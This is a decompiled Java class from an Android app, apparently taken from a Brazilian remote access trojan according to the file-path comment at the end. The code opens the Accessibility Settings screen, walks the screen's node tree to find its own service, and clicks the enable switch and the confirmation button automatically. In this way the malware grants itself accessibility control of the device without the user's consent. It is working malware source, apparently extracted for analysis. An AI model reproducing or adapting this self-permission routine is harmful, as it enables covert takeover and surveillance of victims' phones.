package com.irifix;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.os.Handler;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class b {
  private static Context a;
  
  private static boolean b = false;
  
  private static boolean c = false;
  
  private static boolean d = false;
  
  private static boolean e = false;
  
  private static String f = "";
  
  public static void a(AccessibilityEvent paramAccessibilityEvent) {
    List<AccessibilityNodeInfo> list2;
    if (!b)
      return; 
    int i = paramAccessibilityEvent.getEventType();
    if (i != 32 && i != 4096)
      return; 
    AccessibilityNodeInfo accessibilityNodeInfo = a.a();
    if (accessibilityNodeInfo == null)
      return; 
    if (accessibilityNodeInfo.getPackageName() == null)
      return; 
    String str = accessibilityNodeInfo.getPackageName().toString();
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("(");
    stringBuilder.append(f);
    stringBuilder.append(")");
    if (!str.matches(stringBuilder.toString()))
      return; 
    List<AccessibilityNodeInfo> list1 = a.a(accessibilityNodeInfo);
    if (!a.a(list1))
      return; 
    if (i == 32) {
      if (!c && !d) {
        b(accessibilityNodeInfo, false);
      } else if (c && !d) {
        StringBuilder stringBuilder1 = new StringBuilder();
        stringBuilder1.append("(");
        stringBuilder1.append(e.a());
        stringBuilder1.append(")");
        list2 = a.b(stringBuilder1.toString(), list1);
        list1 = a.a("(android.widget.Switch)", list1);
        if (a.a(list2) && a.a(list1)) {
          d = true;
          d.a(list1.get(0));
        } 
      } else {
        StringBuilder stringBuilder1 = new StringBuilder();
        stringBuilder1.append("(.*");
        stringBuilder1.append(e.a());
        stringBuilder1.append(".*)");
        list2 = a.b(stringBuilder1.toString(), list1);
        list1 = a.c("(.*:id/button1)", list1);
        if (a.a(list2) && a.a(list1))
          ((AccessibilityNodeInfo)list1.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId()); 
      } 
    } else if (!c && !d && e) {
      e = false;
      b((AccessibilityNodeInfo)list2, true);
    } 
  }
  
  public static boolean a(Context paramContext) {
    a = paramContext;
    (new Timer()).schedule(new TimerTask(paramContext) {
          public void run() {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.addFlags(268435456);
            intent.addFlags(67108864);
            intent.addFlags(8388608);
            List list = this.a.getPackageManager().queryIntentActivities(intent, 0);
            if (list.size() > 0) {
              b.a(true);
              b.b(false);
              b.c(false);
              b.d(false);
              b.a(((ResolveInfo)list.get(0)).activityInfo.packageName);
              b.a().startActivity(intent);
            } 
          }
        }200L);
    long l = g.d();
    boolean bool = false;
    while (true) {
      if (g.d() - l < 10000L) {
        try {
          Thread.sleep(100L);
        } catch (InterruptedException interruptedException) {}
        boolean bool1 = g.a(paramContext, e.b());
        bool = bool1;
        if (bool1) {
          bool = bool1;
          b = false;
          return bool;
        } 
        continue;
      } 
      b = false;
      return bool;
    } 
  }
  
  private static void b(AccessibilityNodeInfo paramAccessibilityNodeInfo, boolean paramBoolean) {
    if (paramBoolean) {
      (new Handler()).postDelayed(new Runnable(paramAccessibilityNodeInfo) {
            public void run() {
              b.a(this.a, false);
            }
          }200L);
    } else {
      List<AccessibilityNodeInfo> list1 = a.a(paramAccessibilityNodeInfo);
      if (!a.a(list1))
        return; 
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("(");
      stringBuilder.append(e.a());
      stringBuilder.append(")");
      List<AccessibilityNodeInfo> list2 = a.b(stringBuilder.toString(), list1);
      if (a.a(list2)) {
        c = true;
        d.a(list2.get(0));
      } else {
        list1 = a.a(AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD, list1);
        if (!a.a(list1))
          return; 
        e = true;
        ((AccessibilityNodeInfo)list1.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD.getId());
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */